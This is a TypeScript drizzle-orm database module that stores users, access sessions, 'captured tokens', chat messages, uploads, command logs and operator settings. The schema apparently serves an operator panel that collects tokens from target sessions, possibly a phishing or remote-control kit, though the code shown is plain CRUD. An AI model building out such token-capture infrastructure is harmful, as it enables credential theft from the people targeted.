import { eq, desc } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, accessSessions, InsertAccessSession, capturedTokens, InsertCapturedToken, chatMessages, InsertChatMessage, uploads, InsertUpload, commandLogs, InsertCommandLog, systemSettings, InsertSystemSettings } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// Queries para Access Sessions
export async function createAccessSession(data: InsertAccessSession) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(accessSessions).values(data);
  return result;
}

export async function getAccessSessions(limit = 50) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(accessSessions).orderBy((t) => desc(t.createdAt)).limit(limit);
}

export async function getAccessSessionById(sessionId: string) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(accessSessions).where(eq(accessSessions.sessionId, sessionId)).limit(1);
  return result[0] || null;
}

export async function updateAccessSession(sessionId: string, data: Partial<InsertAccessSession>) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.update(accessSessions).set(data).where(eq(accessSessions.sessionId, sessionId));
}

// Queries para Tokens Capturados
export async function createCapturedToken(data: InsertCapturedToken) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(capturedTokens).values(data);
}

export async function getTokensBySession(sessionId: string) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(capturedTokens).where(eq(capturedTokens.sessionId, sessionId)).orderBy((t) => desc(t.createdAt));
}

// Queries para Chat
export async function createChatMessage(data: InsertChatMessage) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(chatMessages).values(data);
}

export async function getChatMessages(sessionId: string) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(chatMessages).where(eq(chatMessages.sessionId, sessionId)).orderBy((t) => t.createdAt);
}

// Queries para Uploads
export async function createUpload(data: InsertUpload) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(uploads).values(data);
}

export async function getUploadsBySession(sessionId: string) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(uploads).where(eq(uploads.sessionId, sessionId));
}

// Queries para Command Logs
export async function createCommandLog(data: InsertCommandLog) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(commandLogs).values(data);
}

export async function getCommandLogs(sessionId: string) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(commandLogs).where(eq(commandLogs.sessionId, sessionId)).orderBy((t) => desc(t.createdAt));
}

// Queries para Settings
export async function getOrCreateSettings(operatorId: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const existing = await db.select().from(systemSettings).where(eq(systemSettings.operatorId, operatorId)).limit(1);
  if (existing.length > 0) return existing[0];
  const result = await db.insert(systemSettings).values({ operatorId });
  return result;
}

export async function updateSettings(operatorId: number, data: Partial<InsertSystemSettings>) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.update(systemSettings).set(data).where(eq(systemSettings.operatorId, operatorId));
}
